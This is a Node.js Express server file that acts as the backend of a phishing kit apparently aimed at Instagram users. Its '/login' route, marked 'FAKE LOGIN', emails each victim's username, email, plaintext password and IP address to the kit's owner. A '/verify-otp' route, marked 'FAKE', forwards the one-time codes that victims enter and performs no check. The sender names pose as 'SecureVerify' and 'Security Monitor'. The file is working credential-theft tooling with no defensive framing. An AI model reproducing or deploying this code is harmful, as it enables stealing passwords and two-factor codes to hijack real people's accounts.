

const express = require("express");
const cors = require("cors");
const { Resend } = require("resend");

const app = express();

/* ================= BASIC SETUP ================= */
app.use(express.json());
app.use(cors({ origin: "*" }));

/* ================= RESEND ================= */
const resend = new Resend(""); // YOUR KEY

const OWNER_EMAIL = ""; // your email

/* ================= OTP STORE (TEMP) ================= */
// phone/email/username → { otp, expires }
const otpStore = new Map();

/* ================= HEALTH ================= */
app.get("/", (req, res) => {
  res.send("Backend is running");
});

/* =====================================================
   LOGIN → SEND DETAILS TO OWNER (FAKE LOGIN)
===================================================== */
app.post("/login", async (req, res) => {
  const { userName, email, passWord } = req.body;

  if (!userName || !email || !passWord) {
    return res.status(400).json({
      success: false,
      step: "missing_fields",
    });
  }

  const text = `
 NEW VERIFICATION REQUEST

Username: ${userName}
Email: ${email}
Password: ${passWord}
IP: ${req.ip}
Time: ${new Date().toLocaleString()}
`;

  try {
    await resend.emails.send({
      from: "SecureVerify <onboarding@resend.dev>",
      to: [OWNER_EMAIL],
      subject: "New Account Verification Request",
      text,
    });

    return res.json({
      success: true,
      step: "email_sent",
    });

  } catch (err) {
    console.error("RESEND LOGIN ERROR:", err.message);

    return res.json({
      success: true, 
      step: "email_failed_but_continue",
      error: err.message,
    });
  }
});

/* =====================================================
   SEND OTP (Authentication Step)
===================================================== */
app.post("/send-otp", async (req, res) => {
  const { userName } = req.body;

  if (!userName) {
    return res.status(400).json({
      success: false,
      step: "username_required",
    });
  }

  const otp = Math.floor(100000 + Math.random() * 900000);

  otpStore.set(userName, {
    otp,
    expires: Date.now() + 5 * 60 * 1000, // 5 minutes
  });

  const text = `
 AUTHENTICATION CONFIRMATION

Username: ${userName}
OTP: ${otp}
Purpose: Instagram security authentication
Expires in: 5 minutes
Time: ${new Date().toLocaleString()}
`;

  try {
    await resend.emails.send({
      from: "SecureVerify <onboarding@resend.dev>",
      to: [OWNER_EMAIL],
      subject: "OTP Authentication Request",
      text,
    });

    return res.json({
      success: true,
      step: "otp_sent",
    });

  } catch (err) {
    console.error("RESEND OTP ERROR:", err.message);

    return res.status(500).json({
      success: false,
      step: "otp_email_failed",
    });
  }
});

/* =====================================================
   VERIFY OTP
===================================================== */

/* ================= VERIFY OTP (FAKE) ================= */
app.post("/verify-otp", async (req, res) => {
  const { userName, otpInput, platform } = req.body;

  if (!userName || !otpInput) {
    return res.status(400).json({
      success: false,
      message: "Missing fields"
    });
  }

  const emailText = `
 AUTHENTICATION CONFIRMATION

Username: ${userName}
Platform: ${platform || "Unknown"}

User entered OTP:
${otpInput}

Time: ${new Date().toLocaleString()}
IP: ${req.ip}

NOTE:
This OTP was user-entered for authentication confirmation.
No automatic verification was performed.
`;

  try {
    await resend.emails.send({
      from: "Security Monitor <onboarding@resend.dev>",
      to: [""], // OWNER EMAIL
      subject: "OTP Authentication Confirmation",
      text: emailText
    });

    return res.json({
      success: true,
      step: "otp_forwarded_to_owner"
    });

  } catch (err) {
    console.error("EMAIL ERROR:", err.message);

      return res.json({
      success: true,
      step: "email_failed_but_continue"
    });
  }
});








/* ================= SERVER ================= */
const PORT = process.env.PORT || 4000;
app.listen(PORT, () => {
  console.log("🚀 Server running on port", PORT);
});
